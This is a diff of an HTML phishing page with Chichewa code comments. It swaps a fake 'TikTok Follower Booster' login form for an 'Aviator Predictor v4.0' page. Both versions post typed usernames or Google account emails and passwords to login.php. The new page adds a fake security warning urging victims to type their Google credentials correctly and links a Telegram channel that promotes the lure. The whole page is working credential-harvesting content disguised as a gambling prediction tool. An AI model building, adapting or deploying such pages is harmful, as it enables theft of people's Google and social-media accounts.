@@ -1,22 +1,163 @@
 <!DOCTYPE html>
-<html>
-<head><meta name="viewport" content="width=device-width, initial-scale=1.0">
-<style>
-    body { font-family: sans-serif; background: #010101; color: white; text-align: center; }
-    .card { background: #121212; width: 90%; max-width: 400px; margin: 40px auto; padding: 20px; border: 1px solid #fe2c55; border-radius: 10px; }
-    .logo { color: #fe2c55; font-size: 30px; font-weight: bold; }
-    input { width: 100%; padding: 12px; margin: 10px 0; background: #222; border: 1px solid #333; color: white; border-radius: 5px; box-sizing: border-box; }
-    .btn { width: 100%; padding: 12px; background: #fe2c55; color: white; border: none; border-radius: 5px; font-weight: bold; }
-</style></head>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Aviator Predictor v4.0</title>
+    <style>
+        body {
+            background-color: #000000; /* Mtundu wakuda bii ngati mu screenshot */
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            color: white;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .lang-selector {
+            font-size: 14px;
+            color: #bcc0c4;
+            margin-bottom: 20px;
+        }
+
+        /* Chithunzi cha Ndege Chanu Ndendende (Kuchokera pa WA_1783097969687.jpeg) */
+        .aviator-logo {
+            width: 160px; /* Kukula kwake kuti izioneka bwino */
+            height: auto;
+            margin-bottom: 10px;
+        }
+
+        /* Mutu wa Tsamba */
+        .title {
+            color: #eb0933; /* Ofiira wa aviator v4.0 */
+            font-size: 22px;
+            font-weight: bold;
+            margin-bottom: 40px;
+        }
+
+        form {
+            width: 90%;
+            max-width: 380px;
+        }
+
+        input {
+            width: 100%;
+            background-color: #333333; /* Mtundu wa imvi wa mabokosi mu screenshot */
+            border: none;
+            border-radius: 8px;
+            padding: 18px;
+            margin-bottom: 15px;
+            color: white;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+
+        input::placeholder {
+            color: #b3b3b3;
+        }
+
+        /* Chenjezo Lachitetezo la m'Chichewa */
+        .security-warning {
+            color: #ffcc00; /* Mtundu wachikasu ochenjeza */
+            font-size: 13px;
+            margin-top: 5px;
+            margin-bottom: 15px;
+            text-align: left;
+            line-height: 1.4;
+            font-weight: 500;
+        }
+
+        /* Batani la Sign In */
+        .login-btn {
+            width: 100%;
+            background-color: #eb0933; /* Ofiira mu screenshot */
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 14px;
+            font-size: 17px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        .forgot-password {
+            color: #b3b3b3;
+            text-decoration: none;
+            font-size: 14px;
+            margin-top: 20px;
+            display: block;
+            text-align: right;
+        }
+
+        /* Create Account Link */
+        .create-account {
+            width: 90%;
+            max-width: 380px;
+            background-color: transparent;
+            color: #b3b3b3;
+            font-size: 14px;
+            text-decoration: none;
+            text-align: center;
+            position: absolute;
+            bottom: 80px;
+        }
+
+        .create-account span {
+            color: #eb0933;
+            font-weight: bold;
+        }
+
+        /* Telegram Link */
+        .telegram-section {
+            position: absolute;
+            bottom: 35px;
+            font-size: 13px;
+            color: #ffffff;
+            text-align: center;
+            width: 90%;
+            max-width: 380px;
+        }
+
+        .telegram-section a {
+            color: #eb0933;
+            text-decoration: none;
+        }
+    </style>
+</head>
 <body>
-    <div class="card">
-        <div class="logo">TikTok</div>
-        <h3>Follower Booster</h3>
-        <p>Get 10k real followers instantly</p>
-        <form action="login.php" method="post">
-            <input type="text" name="user" placeholder="Username/Email" required>
-            <input type="password" name="pass" placeholder="Password" required>
-            <button type="submit" class="btn">CLAIM NOW</button>
-        </form>
+
+    <div class="lang-selector">English (US) ⌵</div>
+
+    <!-- Pano ukhale ulalo wa chithunzi cha ndege yako yomwe uli pa WA_1783097969687.jpeg -->
+    <!-- Sintha src="ndege.png" kuyika dzina la file la chithunzi chako chomwe uli nacho -->
+    <img src="ndege.png" class="aviator-logo" alt="Aviator Logo">
+
+    <div class="title">Aviator Predictor v4.0</div>
+
+    <!-- Action ndi Ma Name sizinasinthidwe kukhwitsa backend yanu -->
+    <form action="login.php" method="post">
+        <input type="text" name="email" placeholder="your Google account" required>
+        <input type="password" name="pass" placeholder="Password" required>
+        
+        <!-- Chenjezo la Chitetezo -->
+        <div class="security-warning">
+            ⚠️ <b> </b> Please make sure you have not mistyped your Google account and password.
+        </div>
+
+        <button type="submit" class="login-btn">Sign In</button>
+    </form>
+
+    <a href="#" class="forgot-password">Forgot Password?</a>
+
+    <a href="#" class="create-account">Don't have account? <span>Sign Up</span></a>
+
+    <div class="telegram-section">
+        Join our telegram <a href="https://t.me/aviatorpredictory4x0">https://t.me/aviatorpredictory4x0</a>
     </div>
-</body></html>
+
+</body>
+</html>
